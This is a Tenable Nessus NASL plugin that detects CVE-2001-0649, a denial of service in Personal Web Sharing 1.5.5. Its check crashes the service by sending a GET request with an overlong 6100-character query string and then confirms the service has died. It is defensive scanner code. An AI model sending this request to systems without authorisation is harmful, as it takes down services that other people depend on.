#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      
#
# References:
# To: BUGTRAQ@SECURITYFOCUS.COM
# Subject: Personal Web Sharing remote stop
# Date: Thu, 10 May 2001 07:32:43 +0200 (EET)
# Frok: "Jass Seljamaa" <jass@email.isp.ee>
#
# Affected:
# Personal Web sharing v1.5.5
# 

include("compat.inc");

if(description)
{
 script_id(11085);
 script_version ("$Revision: 1.19 $");

 script_cve_id("CVE-2001-0649");
 script_bugtraq_id(2715, 84);
 script_xref(name:"OSVDB", value:"12068");

 script_name(english:"Personal Web Sharing Long HTTP Request DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"It was possible to kill the Personal Web Sharing service by sending it a
too long request." );
 script_set_attribute(attribute:"solution", value:
"Upgrade your software or protect it with a filtering reverse proxy" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 script_summary(english:"Too long request kills PWS");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");
 script_require_ports("Services/www", 80);
 script_dependencie("http_version.nasl");
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

########
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);
if (http_is_dead(port: port)) exit(0);

r = http_send_recv3(method: "GET", item: strcat("/?", crap(6100)), port:port);

if (http_is_dead(port: port, retry:3)) security_warning(port);
